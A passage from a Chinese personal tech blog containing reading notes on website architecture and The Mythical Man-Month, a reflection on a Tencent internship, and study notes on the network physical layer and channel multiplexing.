title="代码优化"></a>代码优化</h4><ul><li>多线程：使用多线程处理IO与多cpu一般算法：多线程数=[任务执行时间/(任务执行时间-IO等待时间)]* cpu内核数量</li><li>将对象设计成无状态：在多并发时对象不会因多线程导致状态改变</li><li>使用局部对象：在方法内创建对象</li><li>并发访问使用锁：锁将并发操作转化为顺序操作</li><li>资源复用：使用单例模式和对象池</li><li>数据结构：使用数据结构+算法的形式优化代码可以极大的优化性能</li><li>垃圾回收：垃圾回收机制有利于性能提升</li></ul><h2 id="网站高可用架构"><a href="#网站高可用架构" class="headerlink" title="网站高可用架构"></a>网站高可用架构</h2><h4 id="网站高可用性度量"><a href="#网站高可用性度量" class="headerlink" title="网站高可用性度量"></a>网站高可用性度量</h4><p>网站不可用时间（故障时间）=故障修复时间点-故障发现（报告）时间点</p><p>网站年度可用性指标=（1-网站不可用时间/年度总时间）×100%</p><p>对于大多数网站而言，2个9是基本可用，网站年度不可用时间小于88小时；3个9是较高可用，网站年度不可用时间小于9小时；4个9是具有自动恢复能力的高可用，网站年度不可用时间小于53分钟；5个9是极高可用性，网站年度不可用时间小于5分钟。</p><h4 id="网站可用性考核"><a href="#网站可用性考核" class="headerlink" title="网站可用性考核"></a>网站可用性考核</h4><p><img src="/img/loading.gif" data-original="/随笔/《大型网站技术架》读书笔记/useWeight.jpeg" alt="考核"></p><p>故障分=故障时间（分钟）× 故障权重</p><h4 id="高可用的服务"><a href="#高可用的服务" class="headerlink" title="高可用的服务"></a>高可用的服务</h4><ul><li>服务器分级：将服务器分不同级别，核心应用和服务优先使用更好的服务器</li><li>超时设置：由于宕机或死锁等其他情况，超时后可设置调度到其他服务器</li><li>异步调用：异步调用减少服务器压力</li><li>服务降级：高峰期使用服务器降级，拒绝服务（拒绝部分请求）或关闭服务（关闭非核心服务）</li><li>幂等性设计：服务层必须保证多次调用和一次调用结果一致</li></ul><h4 id="数据可用性"><a href="#数据可用性" class="headerlink" title="数据可用性"></a>数据可用性</h4><ul><li>数据持久性： 多个副本，在某个存储出错后数据不会丢失</li><li>数据可访问性：切换数据源时用户无感知</li><li>数据一致性：不同副本保证数据一致</li></ul><h4 id="网站运行监控"><a href="#网站运行监控" class="headerlink" title="网站运行监控"></a>网站运行监控</h4><p>不允许没有监控的系统上线</p><ul><li>用户行为日志收集</li><li>服务器端日志收集</li><li>客户端浏览器日志收集</li><li>服务器性能监控</li><li>运行数据报告</li></ul><h5 id="小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。"><a href="#小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。" class="headerlink" title="小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。"></a>小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。</h5></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/随笔/the-mythical-man-month/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/随笔/the-mythical-man-month/" itemprop="url">《人月神话》整理</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-24T16:12:37+08:00">2018-09-24</time></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>实习后，发现自己一些薄弱的点，需要好好加固一些。好在现在又学校可回，索性逃回学校重新修炼，学一些想学的，加固自己薄弱的，至少不要在职场坑了队友。</p><p>《人月神话》一书，其主要介绍人/月等方面的项目管理，从项目经理角度对产品的一些想法及经验，帮助对产品的管理有了较深刻的理解。43年前出版至今依然畅销，不仅感叹作者的独特眼光、软件工程发展的缓慢。也使得我对这一学科有了更深的理解。</p><h3 id="编程的乐趣"><a href="#编程的乐趣" class="headerlink" title="编程的乐趣"></a>编程的乐趣</h3><ul><li>创建事物的快乐</li><li>开发对其他人有用的乐趣</li><li>将类似可以组装的零部件组装，这个过程本身具有魅力</li><li>面对重复任务，不断学习的乐趣</li><li>软件的存在形式不同于其他实际物体，工作在轻易驾驭的介质上的乐趣</li></ul><h3 id="编程的烦恼"><a href="#编程的烦恼" class="headerlink" title="编程的烦恼"></a>编程的烦恼</h3><ul><li>将做事的方式调整到追求完美是<em>最困难</em>的部分</li><li>有其他人来设定目标，必须依靠自己无法控制的程序来完成事情</li><li>真正的权威来自于每次任务的完成</li><li>伴随着枯燥艰苦的劳动</li><li>越接近目标收敛越慢</li><li>只有实际需要才会想到最新的设想</li></ul><h3 id="人月神话"><a href="#人月神话" class="headerlink" title="人月神话"></a>人月神话</h3><ul><li>缺乏合理的时间进度是造成项目滞后最主要的原因——比其他原因都大</li><li>某些任务在不损害结果的情况下加快速度</li><li>所有编程人员都是乐观主义者——“一切都将良好运行”</li><li><em>构思本身就有缺陷，因此总会有bug</em></li><li>人员数量和时间是不可替换的——1个孕妇10月怀胎生子，10个孕妇不可能1个月生子</li><li>分解任务会话费额外的时间——培训和相互沟通</li><li>进度安排——1/3计划， 1/6编程， 1/4构建测试， 1/4系统测试</li><li>Brooks法则：为进度落后的项目增加人手，只会似的进度更加落后 —— 重新分配任务的打断；培训新人；额外的沟通</li></ul><h3 id="团队的组建"><a href="#团队的组建" class="headerlink" title="团队的组建"></a>团队的组建</h3><p><img src="/img/loading.gif" data-original="/随笔/the-mythical-man-month/mythical-team.jpeg" alt="team"></p><ul><li><p>小型精干的团队是最好的</p></li><li><p>一位首席程序员、类似于外科手术队伍的团队架构提供了一种方法—既能获得由少数头脑产生的产品完整性，又能得到多位协助人员的总体生产率，还彻底地减少了沟通的工作量。</p></li><li><h4 id="结构师的使命"><a href="#结构师的使命" class="headerlink" title="结构师的使命"></a>结构师的使命</h4><p>​ 结构师只能提出建议，牢记开发人员实现创造性的使命</p><p>​ 时刻准备为制定说明建议一种实现方法，准备接受任何可行方法</p><p>​ 对建议保持平静及低调</p><p>​ 准备对建议改进及坚持放弃</p><p>​ 听取开发人员在系统结构上的改进</p></li></ul><h3 id="系统的设计"><a href="#系统的设计" class="headerlink" title="系统的设计"></a>系统的设计</h3><ul><li><p>概念的完整性是重中之重</p></li><li><p>“功能与理解上的复杂程度比值才是系统设计最终目标”</p></li><li><p>将系统结构方面的工作与具体实现分离是获得概念完整性的最好方法</p></li><li><p>外部的体系结构规定实习上是增强小组的创造性</p></li><li><p>尽早交流和持续沟通能够使得结构师有较好的成本意识，是开发人员对设计有信心</p></li><li><p>第二个系统通常是人们所设计的最危险的系统，通常是过分的进行设计</p></li><li><p>为了概念完整性，设计必须又一个人或者具有共识的小型团队完成，设计结果必须由一个或者两个人来完成，以保证结果一致</p></li><li><p>必须明确定义系统结构中与先前定义不同的地方，重新定义详细程度应该与之前保持一致</p></li><li><p>出于精确性，需要形式化的定义，也需要一些记叙性的定义来加深理解</p></li><li><p>起初至少有两种以上的实现，定义会更加整洁和规范</p></li><li><p>结构师对实现人员的询问作出电话的解释和问答是非常重要的，必须进行日志整理和发布</p></li></ul><h3 id="项目成功的要点"><a href="#项目成功的要点" class="headerlink" title="项目成功的要点"></a>项目成功的要点</h3><h4 id="交流"><a href="#交流" class="headerlink" title="交流"></a>交流</h4><ul><li>因为团队之间不知道在做什么，从而出现进度灾难、功能不合理和系统缺陷。由于存在对他人进度的各种假设，团队之间成员开始理解出现偏差</li><li>团队应该以尽可能多的方式进行相互之间的交流，非正式的进行简要技术趁熟的常规会议项目，共享的正式项目工作手册【以及电子邮件】</li></ul><h4 id="项目工作手册"><a href="#项目工作手册" class="headerlink" title="项目工作手册"></a>项目工作手册</h4><p>​ ——是对项目必须产生一系列文档进行的一种组织结构</p><ul><li>项目所有文档都是工作手册的一部分</li><li>需要尽早仔细的设计工作手册结构</li><li>项目成员应该只能看到自己需要的部分，没有人需要或者看到其他部分结构，只需要了解接口</li><li>及时跟新十分重要</li></ul><h4 id="组织架构"><a href="#组织架构" class="headerlink" title="组织架构"></a>组织架构</h4><ul><li><p>团队的目标是为了减少必要的交流和协作量</p></li><li><p>为了减少交流，组织结构包括了人力划分及限定职责范围</p></li><li><p>组织交流应该是网状的，而不是树状的</p></li><li><p>每个子产品应该具有两个领导角色——产品负责人，技术主管（结构师）</p><p>​ —— 产品负责人和技术主管可以是同一个人</p><p>​ —— 产品经理为总指挥，技术主管左右手</p><p>​ —— 技术主管为总指挥，产品经理左右手</p></li></ul><h4 id="未雨绸缪"><a href="#未雨绸缪" class="headerlink" title="未雨绸缪"></a>未雨绸缪</h4><ul><li>软件工程师在着手发布产品之前，应该进行试验性系统的现场测试</li><li>第一个开发的系统对于大多数项目可能并不太合用，太多问题，系统的丢弃和重新设计可以一步完成也可以一步步完成，但这是必须完成的步骤</li><li>为舍弃而计划，这是无论如何要做的一个步</li><li>用户的实际需要会随着程序的构件、测试和使用而变化</li><li>由于软件产品易于掌握的特性和不可见性，导致构件人员面临着永恒的需求变更</li><li>灵活的组织架构对于软件开发是一个长期有效的解决方案</li><li>为变更组建团队比为变更进行设计更加困难</li><li>每次修复之后应该重新编译一边系统，确保系统不会因为隐蔽的方式破坏</li><li>所有修改都倾向于破坏系统的架构，增加了系统的混乱程度，以至于系统退化到必须重新设计</li><li>一次分给某个小组连续的目标时间块被证明是最好的安排方法</li></ul><h4 id="项目相关知识点"><a href="#项目相关知识点" class="headerlink" title="项目相关知识点"></a>项目相关知识点</h4><ul><li>仅仅通过对编码的部分时间估计，然后乘以其他部分相对系数，是无法得出整个工作精度估计的</li><li>构件独立小型程序数据并不适应与编程系统项目</li><li>程序开发随程序规模的增大而增长</li><li>一些研究报告表明时间指数大约在1.5倍预计时间</li><li>相对于其他活动，全职程序员50%时间在用于编程和调试</li><li>对于广泛使用的产品，其维护总成本通常是开发成本的40%或更多</li><li>用户越多，维护成本越多</li><li>缺陷修复总会以20%～50%的几率引入新的bug</li><li>大部分系统调试在夜间进行</li><li>测试数据应该有一部分校验数据，一部分边界数据，一部分无效数据</li></ul><h3 id="项目的文档"><a href="#项目的文档" class="headerlink" title="项目的文档"></a>项目的文档</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">—— 应当包括：</span><br><span class="line"></span><br><span class="line">	 目的：功能是什么，开发原因是什么</span><br><span class="line">	 环境：运行在怎样的机器</span><br><span class="line">	 范围：有效输入范围，允许显示格式</span><br><span class="line">	 实现功能和使用算法：精确阐述它做什么</span><br><span class="line">	 输入——输出格式：必须确切完整</span><br><span class="line">	 操作指令：包括控制台输出正确及异常内容</span><br><span class="line">	 选项：用户功能有哪些，应该怎样进行挑选</span><br><span class="line">	 运行时间：特定运行时间</span><br><span class="line">	 精度和校验：期望精度和如何进行精度检测</span><br></pre></td></tr></table></figure><ul><li>软件开发关键文档应该包括：目标，用户手册，内部文档，进度，预算，组织机构图和工作空间分配</li><li>项目经理应该在项目早期对项目一系列文档进行规范化</li><li>对每个关键文档的维护提供状态监督及预警机制</li><li>每个文档本身就可以作为检查列表或者数据库</li><li>项目经理的主要日常工作是沟通，而不是作出决定；文档使个项目计划和决策在整个团队范围内得到交流</li><li>即使是完全开发给自己的程序，描述性的文字也是必须的，因为会被遗忘</li><li>文档能在整个生命周期客服克服懒惰和进度压力起促进和激励作用</li><li>大多数文档缺少总结性的内容，必须放慢脚步，稳妥进行</li><li>为了使文档易于维护，将他们合并到源程序至关重要，而不是独立文档进行保存</li><li>程序修改人员所使用的文档之中，出了描述事情如何，还应该阐述为什么那样做，目的非常关键</li></ul><h3 id="项目的整体"><a href="#项目的整体" class="headerlink" title="项目的整体"></a>项目的整体</h3><h4 id="整体部分"><a href="#整体部分" class="headerlink" title="整体部分"></a>整体部分</h4><ul><li><p>详尽体系结构工作不但使产品更加易用，而且使开发更容易进行，bug更不容易产生</p></li><li><p>许许多多失败源于产品未精确定义的地方</p></li><li><p>编写代码之前，规格说明必须提交外部测试小组，以详细的检查说明项目完整性和明确性，否则开发人员会自行摸索</p></li><li><p>自上而下的设计方式更容易细化，从四个方面减少bug</p><p>—— 清晰结构</p><p>—— 模块分割</p><p>—— 细节的抑制</p><p>—— 测试</p></li><li><p>大量的辅助性测试代码是有必要的</p></li><li><p>必须有人对变更和版本进行控制和文档化</p></li><li><p>系统测试期间，一次只增加一个构件</p></li><li><p>有时必须回退，推翻顶层设计</p></li></ul><h4 id="祸起萧墙"><a href="#祸起萧墙" class="headerlink" title="祸起萧墙"></a>祸起萧墙</h4><ul><li>一天天的进度落后比重大灾难更难以识别</li><li>根据一个严格的进度表来控制大型项目，进度表由里程碑和日期组成</li><li>里程碑必须是具体的特定的和可度量的事件进行清晰定义</li><li>项目没两周进行仔细修订的活动时间估计，随着开始事件到临近结束不会有太大变化，否则过高或过低的估计在项目结束前三周左右才会有所变化</li><li>如果错过了一个deadline 确保不会错过第二个deadline</li><li>必须有评审机制，使得所有成员可以通过它了解真正的状态，出于这个目的，里程碑的进度和完成文档是关键</li></ul><h3 id="软件工程中根本及次要问题"><a href="#软件工程中根本及次要问题" class="headerlink" title="软件工程中根本及次要问题"></a>软件工程中根本及次要问题</h3><h5 id="根本困难："><a href="#根本困难：" class="headerlink" title="根本困难："></a>根本困难：</h5><p><em>软件开发中最困难的部分是规格说明、设计和测试这些概念上的结构，而不是对概念进行表达和实现逼真程度进行验证</em></p><p>1、复杂度：由多方面形成，不仅仅是由于技术产生困难导致的管理问题，管理层面：全面理解问题变得困难-&gt;妨碍概念上的完整性-&gt;使所有离散出口难以寻找和控制-&gt;引起学习和理解上的负担</p><p>2、一致性：由于兼容等问题，导致一致性降低</p><p>3、可变性：由于平台变化，应用变化，用户等变化导致软件可变性</p><p>4、不可见性：由于软件是不存在具有空间的形体特征，所以很难关联和理解依赖</p><h5 id="解决的希望："><a href="#解决的希望：" class="headerlink" title="解决的希望："></a>解决的希望：</h5><p>1、OO编程：仅仅消除设计表达上的次要困难</p><p>2、人工智能、专家系统：接收数据，对系统推论，诊断及构件，建议接口规则，制定测试策略，记录各种bug产生及优化（目前尚未出现？</p><p>3、自动编程：通过较少的参数迅速描述特征，给定参数前提，制定清晰规则</p><p>4、图形化编程：存在变量范围嵌套，交叉引用等多方面问题</p><p>5、程序验证：进行技术规格测试</p><p>6、环境和工具：统一接口和通用工具，只是消除语法错误</p><p>7、工作站：强大的工作站并不能有魔术般的提高</p><h5 id="概念上根本解决方案："><a href="#概念上根本解决方案：" class="headerlink" title="概念上根本解决方案："></a>概念上根本解决方案：</h5><p>1、购买及自行开发</p><p>2、需求提炼和快速原型</p><p>3、卓越的设计人员</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/随笔/2018-tencent-practice/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/随笔/2018-tencent-practice/" itemprop="url">腾讯三个月实习有感</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-06T10:56:12+08:00">2018-09-06</time></span></div></header><div class="post-body" itemprop="articleBody"><p>时间过得真快，8月31号离职，转眼一星期过去了…</p><p>心情也沉淀了一些，将自己的一些感受记录下来吧～</p><p>于今年三月底勉强的拿到了腾讯的船票，上了这条大船，有幸认识腾讯，接触腾讯和喜欢腾讯。</p><p>于今年五月十九日加入腾讯，开始窥斑见豹之旅。</p><h3 id="初见腾讯"><a href="#初见腾讯" class="headerlink" title="初见腾讯"></a>初见腾讯</h3><p>和大多数实习生一样，一同去滨海大厦办理入职。</p><p>下了公车，在不知所措中猛然发现，原来附近高楼大厦中有一个格外显眼的大楼，便是腾讯滨海大厦了。</p><p>一切都似乎在计划中执行，从签合同到办理证件，从结交朋友到一同入住酒店。似乎是一套标准流程，让人感觉安全和亲切。</p><p>见过滨海后，公司又安排了内部培训。大家讨论方案，脑暴产品，学习借鉴，最终2周后也交上了一份满意的答卷，获得了金奖的好成绩～</p><p>当然，要问我映像最深刻的是什么，要我说，一定是结交朋友了。</p><p>初见腾讯，因为学校原因，自己比较自卑。因为身旁好学校的大把，而自己只是一个末流211。可是大家似乎也不问出身，都很和蔼可亲，让人舒服和信赖，在这里也结交了许多朋友，让我打开新世界的大门。</p><h3 id="在腾讯生活"><a href="#在腾讯生活" class="headerlink" title="在腾讯生活"></a>在腾讯生活</h3><h5 id="在腾讯生活是孤独的"><a href="#在腾讯生活是孤独的" class="headerlink" title="在腾讯生活是孤独的"></a>在腾讯生活是孤独的</h5><p>似乎大家每天都在忙，未曾见过闲人；如果有，便是自己吧。大家似乎都在面对着电脑工作，自己偶尔有休息的时候，只能闲下来玩玩手机，或是逛逛内部贴吧，以迎接下一个需求。</p><h5 id="在腾讯生活是自在的"><a href="#在腾讯生活是自在的" class="headerlink" title="在腾讯生活是自在的"></a>在腾讯生活是自在的</h5><p>在这里没有上班打卡的束缚，不需要早上8，9点必须到，若是自己有需要处理的事情，只需要和leader知会一声即可；没有上班工作服装的要求，可以穿着拖鞋，穿着背心（只要不怕空调冷）头发蓬蓬的来上班都行。</p><p>每天8点半起床，洗漱后去公司吃早餐；下雨天穿拖鞋，即使鞋子湿了，也可以烘干；有时间就去健身，只需要下一层楼即是健身房的我，体重在3个月不变的情况下，体脂从16%到了10%。</p><h3 id="在腾讯学习"><a href="#在腾讯学习" class="headerlink" title="在腾讯学习"></a>在腾讯学习</h3><p>虽然是web前端实习生，但是学习和开拓了不少眼界！</p><h5 id="在腾讯学习机制下"><a href="#在腾讯学习机制下" class="headerlink" title="在腾讯学习机制下"></a>在腾讯学习机制下</h5><p>腾讯有很棒的内部资源，无论是腾讯学院，还是腾讯大学，还是面授课。都有很棒的学习资源。</p><p>而我几乎每天都会花一部分时间听一听这些课程，不为学习精通，是想了解一下这个世界，这些大牛学习了哪些课程，研究了什么方向，到达了什么程度。顺便提升自己，编写代码过程中有哪些需要注意的；有哪些比较好提升效率的工具；学习方向或是整个大方向的运作。在为期3个月的积累上，确实对行业有了新的认知！</p><h5 id="在周围同学中学习"><a href="#在周围同学中学习" class="headerlink" title="在周围同学中学习"></a>在周围同学中学习</h5><p>在这里最感谢四个人了。</p><ul><li><p>导师: 我是一个不爱表达的人，而她很会发现人的情绪波动，和导师畅聊一番后，度过了一段艰苦的日子；在专业方面，学到如何把一个点考虑的完整，如何把一段代码写的更好，还有对项目更深层次的认识；在生活方面，不论是一些小零食，周末加班福利，还是工作烦心后请客吃饭，都让初到公司的我感到许许多多温暖。</p></li><li><p>leader: 非常自豪地说，我有一个非常棒的leader！不论是专业知识，还是整个团队的氛围，都是非常棒！从每天开会的全局把控，到每个小点的细致分工；从团队的迭代速度，到团队技术提升；从团队文化建设，到每个人心态变化…做的非常棒，也在leader身上学到了很多处事原则。学到了心态，责任大于能力！</p></li><li><p>Roger: 如果说在导师身上学到的代码和诚以待人，leader身上学到职业素养和责任义务，那么在Roger身上学到的是为人处事的能力了，这似乎是一个非常虚的词，但是对我帮助却很大。初上职场难免会有一些不适应，不像学校里做的好不好无所谓；而是工作上精益求精，要让别人信赖你，敢放心把事情交给你做。对我处事有了非常大的帮助！</p></li><li><p>聪哥: 前三年的健身经验似乎都被这个暑假打败了，缺少健身教练瞎练，虽然有一些成就，但是发力不对导致身材变形，动作不标准导致事倍功半。而这一个暑假无疑是打破之前所有不标准的开始。也让我从饮食结构上改变，从最初的体脂率16%到现在的10%，而体重几乎没有变化！十分感谢聪哥的帮助！</p></li></ul><h3 id="思考的转变"><a href="#思考的转变" class="headerlink" title="思考的转变"></a>思考的转变</h3><h5 id="对职业的思考"><a href="#对职业的思考" class="headerlink" title="对职业的思考"></a>对职业的思考</h5><p>程序员的代码能力，到了一定的程度似乎都大同小异，最终决定高度的，一定是代码能力相关的其他能力高度及职业素养的高度。</p><ul><li><p>程序员职业素养: 发生问题及时解决，对问题本身去深入探究，面对新东西不畏惧，对所在领域的持续学习……</p></li><li><p>要么不做，要么做好的态度：出自自己手的东西一定要做好，一开始上手时难免踩了不少坑，走了不少弯路，写了不少bug，既然选择要把需求做完，那一定要做好，这一版本下一版本都需要去考虑，虽然当前版本不上该功能，一定要留有接口</p></li><li><p>其他能力: 比如对编译器的理解，对内核的理解，对cpu的理解……</p><p><em>这可能是许许多多的知识组合而成。例如：发生任何问题及代码如何调优，知道如何去优化和找到最佳方案；整个项目的架构及编码，知道这个项目使用什么方式去做是最佳选择；对外时完善内部接口，对内时贴好文档.</em></p></li></ul><h5 id="对项目的思考"><a href="#对项目的思考" class="headerlink" title="对项目的思考"></a>对项目的思考</h5><p>实习后对项目的完整度，细致程度，后期维护程度还有功能完整性又了新的思考。</p><p>一个成熟的商业项目一定是经过不断打磨，不断精致的，这段过程一定很幸苦。但是看到自己的产品时，会有自信感。对于以往的做完项目就完事的态度，是完全两回事。后期维护也尤为重要，这也表示写的代码可维护性要高，对于编写程序及软件工程含义又更深入了。</p><h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><p>非常感谢有这个机会能够在腾讯和大家一起学习一起进步！在这个团体里学到了许多专业技能及专业技能之外的职业技能。也了解了成熟商业模式下大型互联网公司内部的运作方式。虽然只有三个月的实习时间，但是学习和成长是非常多的。抱着去当一颗零时螺丝钉的心态，也一不小心拿到了正式的offer～</p><p>虽然每天加班很辛苦，但很开心～</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/计算机网络/computer-network-chapter2/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/计算机网络/computer-network-chapter2/" itemprop="url">计算机网络--物理层</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-17T21:53:49+08:00">2018-01-17</time></span></div></header><div class="post-body" itemprop="articleBody"><ul><li><p>物理层概念<br>机械特性：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等等。<br>电气特性：指明在接口电缆的各条线上出现的电压的范围。<br>功能特性：指明某条线上出现的某一电平的电压表示何种意义。<br>过程特性：指明对于不同功能的各种可能事件的出现顺序。</p></li><li><p>物理层作用<br>计算机网络设备之间的连接必须依靠物理层的传输介质和相关协议进行。物理层主要负责在物理传输介质之上为“数据链路层”提供一个原始比特流（也就是数据是以一个个0或1的二进制代码形式表示的）的物理连接。其具体作用如下：</p></li><li><p>构建数据通路<br>“数据通路”就是完整的数据传输通道，可以是一段物理介质，也可以是由多段物理介质连接而成的。一次完整的数据传输，包括激活物理连接、传送数据、终止物理连接三个主要阶段。所谓“激活物理连接”，就是不管有多少段物理介质参与，在通信的两个数据终端设备间都要在电气上连接起来，形成一条可以在上面连续传输数据的通路。</p></li><li><p>透明传输<br>物理层中可用的传输介质类型（如不同类型的同轴电缆、双绞线和光纤等）非常多，各自又有相应的通信协议和标准来支持，这就决定了不同的计算机网络可能有不同的“路”。物理层除了要把这些不同的“路”修好外，还要确保这些不同的“路”能“连通”起来，形成通路，最终实现把比特流传输到对端“物理层”，然后向“数据链路层”提交的目的。</p></li><li><p>要实现上述功能，需要物理层具有屏蔽不同传输介质类型和通信协议的功能，让进行网络通信的各方只看到有“路”可行，而不管修这些“路”所用的具体“材料”和相关标准，这就是物理层的“透明传输”功能。</p></li><li><p>传输数据<br>无论是从网络体系结构中哪层发起的通信，最终的数据都得通过最低的“物理层”传输出去，因为这是网络通信的唯一物理通道。但“物理层”的传输单位是比特（bit，也就是“位”，数据中的一个二进制的0或1就代表1位）。“物理层”的基本作用是在发送端通过物理层接口和传输介质将数据按比特流的顺序传送到接收端的物理层。</p></li><li><p>数据编码<br>要使数据能在“物理层”上有效、可靠地传输，最关键的是要确保数据比特流能在对应的“信道”中正常通过。这就涉及“物理层”的数据编码功能，因为不同传输介质所支持的数据编码类型不一样（如归零码、非归零码、曼彻斯特码、差分曼彻斯特码等）。</p></li><li><p>信道的极限容量<br>任何信道中，码元的传输的速率是有上限的，传输的速率超过上限，就会出现严重的码建传绕问题，是的接受段对码元的判决成为不可能。因此有了香浓公式C = Wlog2(1+S/N);</p></li><li><p>数据传输管理<br>“物理层”还具有一定的数据传输管理功能，如基于比特流的数据传输流量控制、差错控制、物理线路的激活和释放等。<br><img src="/img/loading.gif" data-original="/计算机网络/computer-network-chapter2/computer_internet.png" alt="computer_internet"></p><h4 id="信道复用"><a href="#信道复用" class="headerlink" title="信道复用"></a>信道复用</h4><h5 id="频分复用（FDM）"><a href="#频分复用（FDM）" class="headerlink" title="频分复用（FDM）"></a>频分复用（FDM）</h5><p>载波带宽(请注意，这里的“带宽”是频率带宽而不是数据的发送速率，每个子信道可以并行传送一路信号。FDM 用于模拟传输过程。<br>e.g.——-广电HFC网络电视信号(FDM)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OFDM 正交频分复用</span><br><span class="line">OFDM系统比FDM系统要求的带宽要小得多,效率更高</span><br><span class="line">e.g.——-非对称的数字用户环线(ADSL)、数字视频广播(DVB)、高清晰度电视(HDTV)、无线局域网(WLAN)和第4代(4G)移动通信系统</span><br></pre></td></tr></table></figure></li></ul><h4 id="时分复用（TDM）"><a href="#时分复用（TDM）" class="headerlink" title="时分复用（TDM）"></a>时分复用（TDM）</h4><p>在交互时间间隔内在同一信道上传送多路信号。TDM 广泛用于数字传输过程。<br>可能造成线路浪费，TDM信号又称的等时信号。<br>e.g.——–SDH（同步数字体系），ATM(异步传输模式)，IP和HFC网络中CM（电缆调制解调器）与CMTS（电缆调制解调器终端系统）的通信</p><h4 id="波分复用（WDM）"><a href="#波分复用（WDM）" class="headerlink" title="波分复用（WDM）"></a>波分复用（WDM）</h4><p>光的频分复用。在一根光纤上使用不同波长同时传送多路光波信号。WDM 用于光纤信道。WDM与FDM 基于相同原理但它应用于光纤信道的光波传输过程。</p><h4 id="码分复用（CDM）"><a href="#码分复用（CDM）" class="headerlink" title="码分复用（CDM）"></a>码分复用（CDM）</h4><p>每个信道作为编码信道实现位传输（特定脉冲序列）。这种编码传输方式通过传输唯一的时间系列短脉冲完成，但在较长的位时间中则采用时间片断替代。每个信道，都有各自的代码，并可以在同一光纤上进行传输以及异步解除复用。</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/随笔/2017-summery/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/随笔/2017-summery/" itemprop="url">2017总结</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-31T21:50:47+08:00">2017-12-31</time></span></div></header><div class="post-body" 